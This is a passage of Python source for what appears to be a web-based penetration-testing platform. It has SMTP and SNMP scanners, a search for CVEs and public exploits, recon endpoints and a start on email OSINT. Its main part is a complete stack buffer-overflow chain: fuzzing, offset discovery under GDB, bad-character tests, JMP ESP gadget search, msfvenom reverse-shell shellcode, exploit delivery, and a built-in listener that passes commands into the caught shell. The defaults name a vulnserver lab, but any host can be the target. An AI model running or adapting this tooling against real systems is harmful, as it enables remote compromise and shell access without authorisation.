        findings.append({"detail":f"SMTP service open — banner: {banner[:100]}","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-200","cwe_name":"Information Exposure","owasp":"A05:2021","remediation":"Disable VRFY/EXPN commands. Use SMTP AUTH."})
        if valid_users:
            findings.append({"detail":f"SMTP VRFY user enumeration succeeded — valid users: {', '.join(valid_users)}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-203","cwe_name":"User Enumeration","owasp":"A05:2021","remediation":"Disable VRFY command: smtpd_disable_vrfy_command=yes in Postfix."})
        if open_relay:
            findings.append({"detail":"SMTP open relay detected — server relays mail for any external domain (used for spam/phishing)","severity":"CRITICAL","cvss":"9.3","cve":"N/A","cwe":"CWE-441","cwe_name":"Open Relay","owasp":"A05:2021","remediation":"Restrict mail relay to authenticated users and trusted hosts only."})

    out = f"SMTP open: {banner}\nUsers: {valid_users}\nOpen relay: {open_relay}" if smtp_open else "SMTP ports 25/587/465 closed"
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"smtp",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"smtp","smtp_open":smtp_open,"banner":banner,"valid_users":valid_users,"open_relay":open_relay,"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ─── SNMP SCANNER ─────────────────────────────────────────────

_SNMP_COMMUNITIES = ["public","private","manager","community","secret","admin","snmp","monitor","internal","cisco","default"]

def _snmp_build_get(community: str, oid_str: str = "1.3.6.1.2.1.1.1.0") -> bytes:
    def enc_len(n):
        return bytes([n]) if n < 128 else bytes([0x81, n]) if n < 256 else bytes([0x82, n >> 8, n & 0xff])
    def tlv(tag, val):
        return bytes([tag]) + enc_len(len(val)) + val
    def enc_oid(s):
        p = [int(x) for x in s.split(".")]
        r = bytes([40 * p[0] + p[1]])
        for v in p[2:]:
            if v == 0: r += b"\x00"
            else:
                buf = []
                while v: buf.insert(0, v & 0x7f); v >>= 7
                r += bytes([(c | 0x80) if i < len(buf)-1 else c for i, c in enumerate(buf)])
        return r
    vbl = tlv(0x30, tlv(0x30, tlv(0x06, enc_oid(oid_str)) + b"\x05\x00"))
    pdu = tlv(0xa0, tlv(0x02, b"\x01") + tlv(0x02, b"\x00") + tlv(0x02, b"\x00") + vbl)
    return tlv(0x30, tlv(0x02, b"\x00") + tlv(0x04, community.encode()) + pdu)

def _snmp_scan(host: str) -> dict:
    _OIDS = {"sysDescr":"1.3.6.1.2.1.1.1.0","sysName":"1.3.6.1.2.1.1.5.0","sysLocation":"1.3.6.1.2.1.1.6.0","sysContact":"1.3.6.1.2.1.1.4.0"}
    result = {"open": False, "community": None, "info": {}}
    for community in _SNMP_COMMUNITIES:
        try:
            s = _socket_lib.socket(_socket_lib.AF_INET, _socket_lib.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(_snmp_build_get(community), (host, 161))
            data, _ = s.recvfrom(4096)
            s.close()
            if data and len(data) > 10:
                result["open"] = True; result["community"] = community
                # Extract printable strings from ASN.1 response
                raw = data.decode("latin-1")
                strings = re.findall(r'[\x20-\x7e]{4,}', raw)
                for name, oid in _OIDS.items():
                    try:
                        s2 = _socket_lib.socket(_socket_lib.AF_INET, _socket_lib.SOCK_DGRAM)
                        s2.settimeout(2); s2.sendto(_snmp_build_get(community, oid), (host, 161))
                        d2, _ = s2.recvfrom(4096); s2.close()
                        r2 = d2.decode("latin-1")
                        vals = re.findall(r'[\x20-\x7e]{4,}', r2)
                        useful = [v for v in vals if v not in (community, "public", "private") and len(v) > 4]
                        if useful: result["info"][name] = useful[-1][:100]
                    except: pass
                break
        except: pass
    return result

@app.post("/api/scan/snmp")
async def scan_snmp(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    snmp = await loop.run_in_executor(None, _snmp_scan, host)
    findings = []
    if snmp["open"]:
        findings.append({"detail":f"SNMP responding with community string '{snmp['community']}' — system info readable anonymously","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-284","cwe_name":"Improper Access Control","owasp":"A05:2021","remediation":"Use SNMPv3 with authentication and encryption. Change default community strings. Block UDP 161 externally."})
        if snmp["community"] in ("public","private"):
            findings.append({"detail":f"Default SNMP community string '{snmp['community']}' in use — trivially guessable","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-521","cwe_name":"Default Credentials","owasp":"A07:2021","remediation":"Change community strings to random values. Migrate to SNMPv3."})
        if snmp["info"].get("sysDescr"):
            findings.append({"detail":f"System info exposed via SNMP: {snmp['info']['sysDescr'][:120]}","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-200","cwe_name":"Information Disclosure","owasp":"A05:2021","remediation":"Restrict SNMP read access. Disable if not needed."})
    out = str(snmp)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"snmp",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"snmp","snmp_open":snmp["open"],"community":snmp["community"],"system_info":snmp["info"],"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ─── EXPLOIT SEARCH ───────────────────────────────────────────

@app.post("/api/scan/exploitsearch")
async def scan_exploitsearch(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    query = req.target.strip()
    findings = []; exploits = []; cves = []
    loop = asyncio.get_event_loop()

    def _search():
        # Search CVE database via cve.circl.lu
        try:
            parts = query.lower().split()
            vendor = parts[0] if parts else query
            product = parts[1] if len(parts) > 1 else parts[0]
            r = _req_lib.get(f"https://cve.circl.lu/api/search/{vendor}/{product}", timeout=15, verify=False)
            if r.status_code == 200:
                data = r.json()
                results = data if isinstance(data, list) else data.get("results", [])
                for item in results[:20]:
                    cvss = str(item.get("cvss", item.get("cvss3", "N/A")))
                    cves.append({"id": item.get("id",""), "summary": str(item.get("summary",""))[:120], "cvss": cvss, "published": str(item.get("Published",""))[:10]})
        except: pass

        # Search ExploitDB via their search API
        try:
            r2 = _req_lib.get(f"https://www.exploit-db.com/search", params={"q": query, "type": "0", "platform": "0"}, timeout=15, verify=False, headers={**_BROWSER_HEADERS, "Accept": "application/json, text/javascript, */*"})
            if r2.status_code == 200:
                try:
                    d2 = r2.json()
                    for row in d2.get("data", [])[:15]:
                        exploits.append({"edb_id": str(row.get("id","")), "title": str(row.get("description",""))[:100], "type": str(row.get("type",{}).get("label","")), "platform": str(row.get("platform",{}).get("label",""))})
                except: pass
        except: pass

        # Fallback: search via Shodan CVE API
        if not cves:
            try:
                r3 = _req_lib.get(f"https://cve.circl.lu/api/last/20", timeout=10, verify=False)
                if r3.status_code == 200:
                    for item in r3.json()[:5]:
                        if query.lower() in str(item.get("summary","")).lower():
                            cves.append({"id": item.get("id",""), "summary": str(item.get("summary",""))[:120], "cvss": str(item.get("cvss","N/A")), "published": str(item.get("Published",""))[:10]})
            except: pass

    await loop.run_in_executor(None, _search)

    if cves:
        critical = [c for c in cves if float(c["cvss"]) >= 9.0 if c["cvss"] not in ("N/A","")]
        high = [c for c in cves if c["cvss"] not in ("N/A","") and 7.0 <= float(c["cvss"]) < 9.0]
        if critical:
            findings.append({"detail":f"{len(critical)} CRITICAL CVE(s) found for '{query}' — top: {critical[0]['id']} (CVSS {critical[0]['cvss']})","severity":"CRITICAL","cvss":critical[0]["cvss"],"cve":critical[0]["id"],"cwe":"N/A","cwe_name":"Known Vulnerability","owasp":"A06:2021","remediation":f"Patch immediately — {critical[0]['summary'][:100]}"})
        if high:
            findings.append({"detail":f"{len(high)} HIGH CVE(s) found for '{query}'","severity":"HIGH","cvss":high[0]["cvss"],"cve":high[0]["id"],"cwe":"N/A","cwe_name":"Known Vulnerability","owasp":"A06:2021","remediation":"Apply vendor patches. Check exploit-db for public PoC."})
    if exploits:
        findings.append({"detail":f"{len(exploits)} public exploit(s) found for '{query}' on ExploitDB — top: {exploits[0]['title'][:80]}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"N/A","cwe_name":"Public Exploit Available","owasp":"A06:2021","remediation":"Patch immediately. Public exploits mean low barrier for attackers."})

    out = f"Query: {query}\nCVEs: {len(cves)}\nExploits: {len(exploits)}"
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"exploitsearch",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"exploitsearch","query":query,"cves":cves,"exploits":exploits,"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  BUFFER OVERFLOW MODULE
# ══════════════════════════════════════════════════════════════

import socket as _sock, struct as _struct, time as _time

class BOFRequest(BaseModel):
    target:       str
    prefix:       str  = ""
    fuzz_step:    int  = 100
    pattern_size: int  = 500
    eip_value:    str  = ""
    offset:       int  = 0
    bad_chars:    str  = "\\x00"
    jmp_esp:      str  = ""
    binary_path:  str  = "/home/kali/vulnserver"
    lhost:        str  = ""
    lport:        int  = 4444
    payload_type: str  = "linux/x86/shell_reverse_tcp"
    shellcode:    str  = ""


def _bof_parse_target(target: str):
    parts = target.strip().replace("tcp://","").replace("http://","").split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999
    return host, port


def _bof_send(host, port, data: bytes, timeout=5) -> bool:
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.recv(1024)
        s.send(data + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        return True
    except Exception:
        return False


def _bof_parse_bad_chars(bad_chars: str) -> list:
    hexes = re.findall(r'[0-9a-fA-F]{2}', bad_chars)
    return [int(h,16) for h in hexes] if hexes else [0x00]

async def _bof_restart_server(binary: str, port: int):
    """Kill existing server and restart it in background, wait until ready."""
    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
    await asyncio.sleep(0.4)
    proc = await asyncio.create_subprocess_exec(
        binary,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    # Wait until "listening" appears in output
    for _ in range(30):
        await asyncio.sleep(0.1)
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=0.2)
            if b"listening" in line.lower() or b"port" in line.lower():
                break
        except asyncio.TimeoutError:
            pass
    await asyncio.sleep(0.2)
    return proc


@app.post("/api/bof/fuzz")
async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    step   = max(10, min(req.fuzz_step, 500))
    size   = step
    crash_at = None
    for _ in range(200):
        payload = prefix + b"A" * size
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.recv(1024)
            s.send(payload + b"\r\n")
            try: s.recv(1024)
            except: pass
            s.close()
        except Exception:
            crash_at = size
            break
        _time.sleep(0.3)
        size += step
    if crash_at:
        return {"crash_at":crash_at,"recommended_pattern_size":crash_at+400,"message":f"Server crashed at {crash_at} bytes"}
    return {"crash_at":None,"message":"No crash detected — check target is running"}


@app.post("/api/bof/offset")
async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    size   = req.pattern_size or 500

    # Generate pattern (pure Python — no msf-pattern_create needed)
    pattern = _cyclic_pattern(size)
    if not pattern:
        return {"error": "Pattern generation failed"}

    binary = req.binary_path or "/home/kali/vulnserver"
    eip_value = req.eip_value.strip() if req.eip_value else None
    offset = None
    gdb_out = ""

    # Auto-detect EIP using GDB if binary is local
    if os.path.exists(binary) and not eip_value:
        try:
            # Kill any existing vulnserver on that port
            subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
            await asyncio.sleep(0.5)

            # Start vulnserver under GDB
            gdb_proc = await asyncio.create_subprocess_exec(
                "gdb", "-q", "--batch",
                "-ex", "set confirm off",
                "-ex", "set pagination off",
                "-ex", "handle SIGSEGV stop print",
                "-ex", "run",
                "-ex", "info registers eip",
                "-ex", "quit",
                binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            # Read output line by line until server is ready
            server_ready = False
            for _ in range(30):  # wait up to 3s
                await asyncio.sleep(0.1)
                try:
                    line = await asyncio.wait_for(
                        gdb_proc.stdout.readline(), timeout=0.2)
                    gdb_out += line.decode("utf-8", errors="replace")
                    if b"listening" in line.lower() or b"port" in line.lower():
                        server_ready = True
                        break
                except asyncio.TimeoutError:
                    pass

            await asyncio.sleep(0.5)

            # Send the pattern
            _bof_send(host, port, prefix + pattern.encode("latin-1"))
            await asyncio.sleep(1.5)

            # Read remaining GDB output (registers after crash)
            try:
                remaining, _ = await asyncio.wait_for(
                    gdb_proc.communicate(), timeout=6)
                gdb_out += remaining.decode("utf-8", errors="replace")
            except asyncio.TimeoutError:
                gdb_proc.kill()

            # Parse EIP
            em = re.search(r"eip\s+0x([0-9a-fA-F]+)", gdb_out, re.IGNORECASE)
            if not em:
                # Also try crash address line: "0x41386541 in ?? ()"
                em = re.search(r"^(0x[0-9a-fA-F]+)\s+in\s+\?\?", gdb_out, re.IGNORECASE | re.MULTILINE)
                if em:
                    eip_value = em.group(1).replace("0x","").upper()
                else:
                    eip_value = None
            else:
                eip_value = em.group(1).upper()

        except Exception as ex:
            gdb_out += f"\n[error] {ex}"

    # Find offset if we have EIP
    if eip_value:
        off_result = await run_tool(
            ["msf-pattern_offset", "-l", str(size), "-q", eip_value], timeout=15)
        m = re.search(r"Exact match at offset (\d+)", off_result.get("output", ""))
        if m: offset = int(m.group(1))

    if not eip_value:
        # Last resort: send pattern and wait for user to enter EIP manually
        _bof_send(host, port, prefix + pattern.encode("latin-1"))

    return {
        "pattern_size": size,
        "eip_value": eip_value or "not captured — enter manually",
        "offset": offset,
        "gdb_log": gdb_out[-500:] if gdb_out else "",
        "message": f"✅ Offset = {offset} bytes  |  EIP = {eip_value}" if offset else "Pattern sent — enter EIP value in the field above to get offset"
    }


@app.post("/api/bof/eip_control")
async def bof_eip_control(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    payload  = prefix + b"A"*req.offset + b"BBBB" + b"C"*max(0,500-req.offset-4)
    _bof_send(host, port, payload)
    return {"offset":req.offset,"payload_size":len(payload),"eip_overwrite":"BBBB (0x42424242)","sent":True,"message":f"Sent {len(payload)} bytes — EIP should show 42424242 in debugger"}


@app.post("/api/bof/badchars")
async def bof_badchars(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    known_bad = _bof_parse_bad_chars(req.bad_chars)
    all_bytes = bytearray([b for b in range(1,256) if b not in known_bad])
    payload  = prefix + b"A"*req.offset + b"BBBB" + bytes(all_bytes) + b"C"*100
    sent = _bof_send(host, port, payload)
    excluded = [f"\\x{b:02x}" for b in known_bad]
    return {"sent":sent,"bytes_tested":len(all_bytes),"excluded":excluded,"payload_size":len(payload),"message":f"Sent {len(all_bytes)} bytes — all sequential = only \\x00 is bad"}


def _elf_find_jmp_esp(binary_path: str, bad_bytes: list, load_base: int = 0) -> list:
    """Pure Python: scan ELF binary for JMP ESP (\\xff\\xe4) — instant, no external tools."""
    gadgets = []
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        if len(data) < 52 or data[:4] != b'\x7fELF' or data[4] != 1:
            return []  # not 32-bit ELF
        e_phoff     = _struct.unpack_from('<I', data, 28)[0]
        e_phentsize = _struct.unpack_from('<H', data, 42)[0]
        e_phnum     = _struct.unpack_from('<H', data, 44)[0]
        JMP_ESP = b'\xff\xe4'
        for i in range(e_phnum):
            h = e_phoff + i * e_phentsize
            if h + 32 > len(data):
                break
            p_type  = _struct.unpack_from('<I', data, h)[0]
            p_flags = _struct.unpack_from('<I', data, h + 24)[0]
            p_off   = _struct.unpack_from('<I', data, h + 4)[0]
            p_vaddr = _struct.unpack_from('<I', data, h + 8)[0]
            p_fsz   = _struct.unpack_from('<I', data, h + 16)[0]
            if p_type != 1 or not (p_flags & 1):   # PT_LOAD + PF_X only
                continue
            seg = data[p_off:p_off + p_fsz]
            idx = 0
            while True:
                pos = seg.find(JMP_ESP, idx)
                if pos == -1:
                    break
                vaddr  = load_base + p_vaddr + pos
                vbytes = list(_struct.pack('<I', vaddr))
                if not any(b in bad_bytes for b in vbytes):
                    le = "".join(f"\\x{b:02x}" for b in vbytes)
                    gadgets.append({"address": f"0x{vaddr:08x}", "gadget": "jmp esp", "little_endian": le})
                idx = pos + 1
    except Exception:
        pass
    return gadgets


@app.post("/api/bof/jmpesp")
async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
    binary    = req.binary_path or "/home/kali/vulnserver"
    bad_bytes = _bof_parse_bad_chars(req.bad_chars)

    # Check ASLR
    try:
        with open("/proc/sys/kernel/randomize_va_space") as _f:
            _aslr = _f.read().strip()
    except Exception:
        _aslr = "?"

    # Step 1 — scan primary binary (instant ELF scan, no external tools)
    gadgets = _elf_find_jmp_esp(binary, bad_bytes, load_base=0)
    source  = binary

    # Step 2 — fallback: find libc via ldd, get load base, scan libc
    if not gadgets:
        try:
            ldd_r = subprocess.run(["ldd", binary], capture_output=True, text=True, timeout=5)
            m = re.search(r'libc[^\s]*\s+=>\s+(\S+)\s+\(0x([0-9a-fA-F]+)\)', ldd_r.stdout)
            if m:
                lib_path = m.group(1)
                lib_base = int(m.group(2), 16)
                gadgets  = _elf_find_jmp_esp(lib_path, bad_bytes, load_base=lib_base)
                if gadgets:
                    source = lib_path
        except Exception:
            pass

    # Step 3 — scan known 32-bit libc paths without load_base (ASLR must be 0)
    if not gadgets:
        for lib in ["/usr/lib32/libc.so.6", "/lib32/libc.so.6",
                    "/usr/lib/i386-linux-gnu/libc.so.6"]:
            if os.path.exists(lib):
                gadgets = _elf_find_jmp_esp(lib, bad_bytes, load_base=0)
                if gadgets:
                    source = lib
                    break

    if not gadgets:
        return {"gadgets": [], "address": "", "aslr": _aslr, "message":
                "No clean JMP ESP found. Ensure ASLR=0: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"}

    best = gadgets[0]
    return {
        "gadgets":      gadgets[:10],   # return top 10 clean gadgets
        "recommended":  best,
        "address":      best["address"],
        "little_endian":best["little_endian"],
        "source":       source,
        "aslr":         _aslr,
        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} -> {best['little_endian']}"
    }


@app.post("/api/bof/shellcode")
async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error":"LHOST required"}
    bad_bytes = "".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])
    cmd = ["msfvenom","-p",req.payload_type,f"LHOST={req.lhost}",f"LPORT={req.lport}","EXITFUNC=thread","-b",bad_bytes,"-f","python","-v","shellcode"]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
    shellcode_py = "\n".join(lines)
    raw = re.findall(r'b"([^"]+)"', shellcode_py)
    raw_bytes = "".join(raw)
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None
    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,"bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,"shellcode_bytes":raw_bytes,"message":f"Shellcode generated: {size} bytes"}


@app.post("/api/bof/exploit")
async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset: return {"error":"Offset required"}
    if not req.jmp_esp: return {"error":"JMP ESP address required"}
    if not req.shellcode: return {"error":"Shellcode required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    addr_int = int(req.jmp_esp.strip(),16)
    retn = _struct.pack("<I",addr_int)
    hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
    sc = bytes([int(h,16) for h in hex_bytes])
    if not sc: return {"error":"Could not parse shellcode"}
    payload = prefix + b"A"*req.offset + retn + b"\x90"*16 + sc
    _bof_send(host, port, payload, timeout=6)
    return {"sent":True,"payload_size":len(payload),"offset":req.offset,"retn":req.jmp_esp,"shellcode_size":len(sc),"message":f"✅ Exploit sent!"}


# ── INTEGRATED SHELL LISTENER ────────────────────────────────
class _ShellSession:
    def __init__(self, lid, lport):
        self.lid    = lid
        self.lport  = lport
        self.output = []
        self.status = "waiting"   # waiting | connected | closed
        self.writer = None
        self.server = None

SHELL_SESSIONS: dict = {}

async def _shell_handler(reader, writer, lid, sessions=None):
    store = sessions if sessions is not None else SHELL_SESSIONS
    addr = writer.get_extra_info("peername")
    s = store.get(lid)
    if not s: return
    s.status = "connected"
    s.writer = writer
    s.output.append(f"[+] Shell connected from {addr[0]}:{addr[1]}\n")
    try:
        while True:
            data = await asyncio.wait_for(reader.read(4096), timeout=300)
            if not data: break
            s.output.append(data.decode("utf-8", errors="replace"))
    except Exception:
        pass
    s.status = "closed"
    try: writer.close()
    except: pass

@app.post("/api/bof/shell/start")
async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"shell_{lport}"
    # Close existing session on same port
    if lid in SHELL_SESSIONS:
        try:
            if SHELL_SESSIONS[lid].server: SHELL_SESSIONS[lid].server.close()
            if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
        except: pass
    # Kill any existing process holding the port (e.g. leftover nc)
    try:
        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    except FileNotFoundError:
        try:
            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
        except Exception:
            pass
    except Exception:
        pass
    await asyncio.sleep(0.5)
    session = _ShellSession(lid, lport)
    SHELL_SESSIONS[lid] = session
    try:
        server = await asyncio.start_server(
            lambda r, w: _shell_handler(r, w, lid), "0.0.0.0", lport,
            reuse_port=True)
        session.server = server
        asyncio.create_task(server.serve_forever())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"Listener ready on port {lport} — send exploit now"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}

@app.get("/api/bof/shell/{lid}/output")
async def bof_shell_output(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}

@app.post("/api/bof/shell/{lid}/cmd")
async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s or not s.writer: return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.writer.write((cmd + "\n").encode())
        await s.writer.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/bof/shell/{lid}/stop")
async def bof_shell_stop(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.pop(lid, None)
    if s:
        try:
            if s.server: s.server.close()
            if s.writer: s.writer.close()
        except: pass
    return {"stopped": True}

@app.post("/api/recon/dnsrecon")
async def recon_dnsrecon(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    recs = await loop.run_in_executor(None, _dns_enum_records, host)
    records = [{"type":r["type"],"name":host,"address":r["value"]} for r in recs]
    out = "\n".join(f"[*] {r['type']} {r['name']} {r['address']}" for r in records)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"dnsrecon","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/crtsh")
async def recon_crtsh(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    subdomains = []
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            r = await client.get(f"https://crt.sh/?q=%.{host}&output=json")
            if r.status_code == 200:
                for entry in r.json():
                    for sub in entry.get("name_value","").split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub and sub not in subdomains:
                            subdomains.append(sub)
    except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "crtsh", req.target, {"output":str(subdomains)})
    return {"scan_id":scan_id,"target":req.target,"tool":"crtsh","subdomains":subdomains,"total":len(subdomains),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/amass")
async def recon_amass(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    subdomains = await _enum_subdomains(host)
    out = "\n".join(subdomains)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "amass", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"amass","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/harvester")
async def recon_harvester(req: ScanRequest, user=Depends(verify_token)):
    return await recon_theharvester(req, user)

@app.post("/api/recon/services")
async def recon_services(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    ports = await _tcp_scan(host)
    out = "\n".join(f"{p['port']}/tcp open {p['service']} {p['version']}" for p in ports)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "services", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"services","ports":ports,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/os")
async def recon_os(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    ports = await _tcp_scan(host, timeout=2.0)
    banners = {str(p["port"]): p["version"] for p in ports if p["version"]}
    os_name = None; matches = []
    # Heuristic OS detection from open ports + banners
    all_text = " ".join(banners.values()).lower()
    if "windows" in all_text or 3389 in [p["port"] for p in ports] or 445 in [p["port"] for p in ports]:
        os_name = "Windows (inferred from ports/banners)"; matches = [{"name":"Windows","accuracy":60}]
    elif "ubuntu" in all_text or "debian" in all_text or "centos" in all_text or "linux" in all_text:
        os_name = "Linux (inferred from banner)"; matches = [{"name":"Linux","accuracy":70}]
    elif "freebsd" in all_text or "openbsd" in all_text:
        os_name = "BSD (inferred from banner)"; matches = [{"name":"BSD","accuracy":65}]
    elif ports:
        os_name = "Linux/Unix (common default)"; matches = [{"name":"Linux/Unix","accuracy":40}]
    out = f"OS guess: {os_name}\nOpen ports: {[p['port'] for p in ports]}"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "os", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"os","os":os_name,"accuracy":matches[0]["accuracy"] if matches else None,"matches":matches,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

def _clean_banner(raw: str) -> str:
    """Strip binary/non-printable bytes from nmap banner output."""
    cleaned = re.sub(r'\\x[0-9a-fA-F]{2}', '', raw)
    cleaned = re.sub(r'[^\x20-\x7E]', ' ', cleaned)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    # If mostly garbage remains (< 4 printable words), use a generic label
    if len(cleaned) < 8:
        return "(binary handshake — see raw output)"
    return cleaned[:200]

@app.post("/api/recon/banner")
async def recon_banner(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    banners = await _banner_grab(host)
    out = "\n".join(f"Port {port}: {_clean_banner(b)}" for port, b in banners.items())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "banner", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"banner","banners":banners,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  OSINT & THREAT INTEL MODULE
# ══════════════════════════════════════════════════════════════

@app.post("/api/osint/email_osint")
async def osint_email_osint(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(
        ["theHarvester", "-d", host, "-b", "crtsh,duckduckgo,hackertarget,urlscan,rapiddns", "-l", "200"],
        timeout=120
    )
    out = result.get("output", "")
    FP_DOMAINS = ["edge-security.com","github.com","python.org","kali.org","harvester"]
    all_emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)
    emails = list(set(e for e in all_emails if not any(fp in e for fp in FP_DOMAINS)))
    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
    # Extract ASNs with known labels
    ASN_NAMES = {"AS13335":"Cloudflare","AS16509":"Amazon AWS","AS396982":"Google Cloud",
                 "AS54113":"Fastly","AS15169":"Google","AS8075":"Microsoft Azure",
                 "AS14061":"DigitalOcean","AS16276":"OVH","AS22612":"Namecheap",
                 "AS45012":"Alibaba Cloud","AS8648":"Sprint/T-Mobile"}
    asns = []
    asn_block = re.search(r"ASNS found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
    if asn_block:
        for l in asn_block.group(1).splitlines():
            a = l.strip()
            if a.startswith("AS"):
                label = ASN_NAMES.get(a, "")
